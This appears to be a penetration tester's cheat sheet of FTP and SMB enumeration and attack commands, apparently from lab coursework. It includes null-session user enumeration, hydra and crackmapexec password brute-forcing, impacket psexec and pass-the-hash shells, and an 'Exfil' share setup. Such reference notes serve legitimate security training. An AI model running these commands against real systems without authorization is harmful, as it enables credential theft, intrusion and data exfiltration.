
### FTP :
```bash
ftp <FQDN/IP>	    Interact with the FTP service on the target.
nc -nv <FQDN/IP> 21	Interact with the FTP service on the target.
telnet <FQDN/IP> 21	Interact with the FTP service on the target.
openssl s_client -connect <FQDN/IP>:21 -starttls ftp	Interact with the FTP service on the target using encrypted connection.

wget -m --no-passive ftp://anonymous:anonymous@<target>	Download all available files on the target FTP server.

#nmap
find / -type f -name ftp* 2>/dev/null | grep scripts
sudo nmap -sV -p21 -sC -A 10.129.14.136
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
```

### SMB:
```bash
using nmap:Invoke-FileFinder
nmap -p 139,445 <target>
nmap --script smb-os-discovery <target>
nmap --script smb-security-mode <target>
nmap --script smb-vuln-ms17-010 <target>
nmap --script smb-vuln* <target>
sudo nmap 10.129.14.128 -sV -sC -p139,445

using enum4linux:
enum4linux -a <target>
enum4linux -U <target>
enum4linux -G <target>
enum4linux -S <target>
enum4linux -P <target>
enum4linux -o <target>

using smbclient:
smbclient -L //<target> -N
smbclient -L //<target> -U <user>%<pass>
smbclient //<target>/<share> -N
smbclient //<target>/<share> -U <user>
smbclient -N -L \\\\10.129.42.253
smbclient //10.129.14.128/notes

using rpcclient:
rpcclient -U <user>%<pass> <target>
rpcclient <target> -U "" -c "enumdomusers"
rpcclient <target> -U "" -c "enumdomgroups"
rpcclient <target> -U "" -c "getdompwinfo"
rpcclient <target> -U "" -c "lookupnames <domain>"
rpcclient -U "" 10.129.14.128

for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done


srvinfo	        Server information.
enumdomains	    Enumerate all domains that are deployed in the network.
querydominfo	Provides domain, server, and user information of deployed domains.
netshareenumall	Enumerates all available shares.
netsharegetinfo <share>	Provides information about a specific share.
enumdomusers	Enumerates all domain users.
queryuser <RID>	Provides information about a specific user.
enumdomusers
queryuser 0x3e9
queryuser 0x3e8
querygroup 0x201





using crackmapexec:
crackmapexec smb <target> --shares -u '' -p ''
crackmapexec smb <target> --shares -u <user> -p <pass>
crackmapexec smb <target> --users -u <user> -p <pass>
crackmapexec smb <target> --groups -u <user> -p <pass>
crackmapexec smb <target> --vulns
crackmapexec smb <target> -u users.txt -p passwords.txt

using smbmap:
smbmap -H <target>
smbmap -H <target> -u <user> -p <pass>
smbmap -H <target> -R <share>

using hydra:
hydra -l <user> -P /path/to/passwordlist.txt smb://<target>
hydra -L users.txt -P passwords.txt smb://<target>


#try to get shell if $ADMIN having write permission for the user
impacket-psexec username@<ip address>
impacket-wmiexec username@<ip address>
impacket-smbclient -hashes:<NTLM hash> Administrator@<ip address>


#use smbget to download all files from smb recursively
smbget -R smb://10.10.10.100/Replication


#**Shows all shared resources (folders/printers) on a computer.**
net view \\127.0.0.1

#Creates a share called Exfil that points to the given folder
net share Exfil=C:\Users\user\Download\exfil

#Lists all shares on the system.
net share

#Shows active sessions (who’s connected to your shares).
net session

#Maps a shared folder to a drive letter (X:).
net use X: \\127.0.0.1\Exfil

#Shows all mapped drives and active share connections.
net use
```